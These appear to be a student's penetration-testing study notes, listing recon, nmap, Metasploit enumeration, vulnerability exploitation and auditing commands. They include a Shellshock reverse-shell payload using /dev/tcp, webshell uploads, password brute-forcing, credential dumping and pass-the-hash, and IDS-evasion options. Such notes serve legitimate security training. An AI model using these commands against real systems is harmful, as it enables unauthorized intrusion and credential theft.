# Information gathering
## Passive information gathering
### website recon & footprinting
whatis host
**host** nrk.no
robots.txt
Browser plugins: **builtwith**, wappalyzer, 
**whatweb** nrk.no
**webhttrack** website copier

### whois
**whois** nrk.no
website footprinting with **netcraft**

### DNS recon
**DNSRecon** tool
**dnsdumpster** tool

### Other tools
WAF with **wafw00f**
Subdomain enumeration with **sublist3r**
**Google dorks**
- site:ine.com inurl:forum 
- site:* ine.com intitle:admin
- filetype:pdf
- cache:ine.com
- wayback machine
- inurl:passwd.txt
- Google hacking database
Email harvesting with **theHarvester**
**haveibeenpwned.com**

## Active Information Gathering
### DNS Zone Transfer
**dnsenum** tool
Example on zonetransfer.me
**dig** tool
**fierce** tool

### Host discovery with nmap
Get your ip: ip a s
**nmap** -sn <ip/subnet>
**netdiscover** tool

### Port scanning with nmap
nmap -Pn -p1-1000 1.1.1.1 custom port range
nmap -Pn -F 1.1.1.1 fast scan
- -sU UDP scan
- -v verbose
- -sV service version detection
- -O operating system
- -sC run nmap scripts
- -T4 timing template
- -oN test.txt output -oX for xml format


# Footprinting and scanning
### Host discovery
**Ping sweeps**
ping and fping: does not work on windows machines

**nmap**
nmap -sn 1.1.1.1 --send-ip
nmap -sn 1.1.1.1-10
nmap -sn -iL target.txt

nmap -sn -PS1-100 1.1.1.1 SYN ping on port range
nmap -sn -PA 1.1.1.1 ACK ping scan. Not very reliable.
nmap -sn -PE 1.1.1.1 ICMP echo scan.

nmap -sn -PS21,22,25,80,445,3389,8080 -T4 1.1.1.1 preferred by teacher
nmap -sn -PS21,22,25,80,445,3389,8080 -PU137,138 -T4 1.1.1.1 UDP for windows

### Port scanning
nmap -Pn : don't ping scan, skip host discovery, do default SYN stealth port discovery
-F : fast profile, the most common ports
-p80,445,3389,8080 : custom ports
-T4 -p- : all 65527 ports
-sS stealth scan (default when root). 
Stealth scan / SYN scan / half-open scan is all same thing.

*filtered* response could be due to firewall
-sT : TCP connect scan, completes 3-way handshake

### Service version and OS detection
`nmap -sn 1.1.1.1/24` to find target with host discovery
`nmap -T4 -sS -p- 1.1.1.1` for port scan
`nmap -T4 -sS -sV -p- 1.1.1.1` for service version detection scan
`nmap -T4 -sS -sV -O -p- 1.1.1.1` OS detection scan
`--osscan-guess` for aggressive OS guesses
`--version-intensity 8` for aggressive version scan

### Nmap Scripting Engine (NSE)
`ls -al /usr/share/nmap/scripts/ | grep -e "http"` find scripts
`nmap -sS -sV -sC -p- -T4 1.1.1.1` will run relevant non-intrusive scripts
`--script=mongodb-info` to specify script (can separate with comma, can use wildcards )
`nmap -sS -A -p- -T4 1.1.1.1` does all OS, service version and scripts


### Evasion, scan performance & output
**Firewall detection & IDS evasion**
`nmap -Pn -sS -F 1.1.1.1`
`nmap -Pn -sA -p445,3389 1.1.1.1` detect firewall
`nmap -Pn -sS -sV -p 80,445,3389 -f 1.1.1.1` **fragmented** packets
`-D 2.2.2.2,3.3.3.3` **decoy** IPs
`--data-length 200` append random bytes

**Optimizing nmap scans**
`--host-timeout 30s` be careful with too small timeout
`--scan-delay 15s` make traffic less suspicious
`-T1` sneaky timing profile for IDS evasion

**Nmap output formats**
`-oN output.txt` normal format 
`-oX` xml format, can be imported to Metasploit
`-v -d` verbosity and debugging
`-vv -dd` for greater effect

# Enumeration
**Importing Nmap scan results into MSF**
```
service postgresql start
msfconsole
workspace -a Win2k12
db_import /root/windows_server_2012
hosts
services
vulns

workspace -a Nmap_MSF
db_nmap -Pn -sV -O 1.1.1.1
```

**Port scanning with auxiliary modules**
```
search portscan
use #
show options
set RHOSTS 1.2.3.4
run

curl 1.2.3.4
search xoda
exploit

sysinfo
shell
/bin/bash -i
ifconfig
run autoroute -s 1.2.3.4
background
sessions
```

### Service Enumeration
**FTP enumeration**
Port 21
```
search type:auxiliary ftp
search ProFTPD

ftp_login:
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE .../unix_passwords.txt

search ftp anonymous
```

**SMB enumeration**
Port 445, originally on 139. 
SAMBA is Linux implementation
```
setg RHOSTS 1.1.1.1
search type:auxiliary smb
info

smb_enumusers
smb_enumshares
smb_login

smbclient -L \\\\1.1.1.1\\ -U admin
smbclient \\\\1.1.1.1\\public -U admin

```

**Web server enumeration**
HTTP port 80, HTTPS port 443.
```
http_version
http_header
robots_txt
dir_scanner
files_dir
http_login
apache_userdir_enum

```

**MySQL enumeration**
HTTP port 3306.
```
mysql_version
mysql_login
mysql_enum
mysql_sql
mysql_schemadump

metasploit: loot, creds
mysql -h 1.1.1.1 -u root -p
```
Can also connect to mysql db directly without msf.

**SSH enumeration**
TCP port 22.
```
ssh_version
ssh_login
sessions
ssh_enumusers
```

**SMTP enumeration**
TCP port 25 default, can slo be 465 and 587.
```
smtp_version
smtp_enum
```


# Vulnerability Assessment
**Windows vulnerabilities**
![[Pasted image 20250108234428.png]]

**Vulnerability scanning with MSF**
Manual check: Scan for services, search for exploits, check info for versions.
`searchsploit "Microsoft Windows SMB" | grep -e "Metasploit"`
`metasploit-autopwn` plugin
- wget the plugin
- `load db_autopwn`
- `db_autopwn -p -t -PI 445`
`analyze` command

**WebDAV vulnerabilities**
`davtest` and `cadaver` tools
`nmap -sV -p80 --script=http-enum 1.1.1.1`
`hydra -L ... -P ... 1.1.1.1 http-get /webdav/`
`davtest -auth user:password -url http://1.1.1.1/webdav`
`cadaver http://1.1.1.1/webdav`
`ls -al /usr/share/webshells`
`put /usr/share/webshells...`
`dir` and `type`

### Vulnerability analysis
**EternalBlue exploit**
Microsoft SMBv1 servers
`AutoBlue-MS17-010` tool
`nc -nvlp 1234` netcat listener
`search eternalblue` in metasploit

**BlueKeep exploit**
Windows RDP protocol
`search BlueKeep`
`show targets`

**Pass-the-hash attacks**
Maintain persistence using hash even if service is patched
```
search badblue
pgrep lsass
load kiwi
lsa_dump_sam

hashdump
search psexec
set SMBPass <LM:NTLM>
set target Native\ upload

crackmapexec smb 1.1.1.1 -u Administrator -H "NTLM hash" - "ipconfig"
```

**Frequently exploited Linux services**
Apache Web Server, SSH, FTP, SAMBA

**Shellshock exploit**
Bash shell vulnerability
```
nmap -sV 1.1.1.1 --script=http-shellshock --script-args="http-shellshock.uri=/gettime.cgi"

User-Agent: (){ :; } echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/1.1.1.1/1234 0>&1'
nc -nvlp 1234

search shellshock
```

### Vulnerability Scanning
**Nessus**
Download Nessus
```
chmod +x ...
sudo dpkg -i ...
sudo systemctl start nessusd.service
```
Can export results and import in to Metasploit
`db_import /...`
`search cve:2015 name:ManageEngine`

**WMAP**
```
load wmap
wmap_sites -a 1.1.1.1
wmap_targets -t http://1.1.1.1
wmap_run -t
wmap_run -e
```

# Auditing Fundamentals
**Security Auditing Process/Lifecycle**
1. Planning and preparation
2. Information gathering
3. Risk assessment
4. Audit execution
5. Analysis and evaluation
6. Reporting
7. Remediation

**Types of security audits**
- Internal audits
- External audits
- Compliance audits
- Technical audits
- Network audits
- Application audits

**Security auditing with Lynis**
Run scan against Lynis controls, compare with own policies



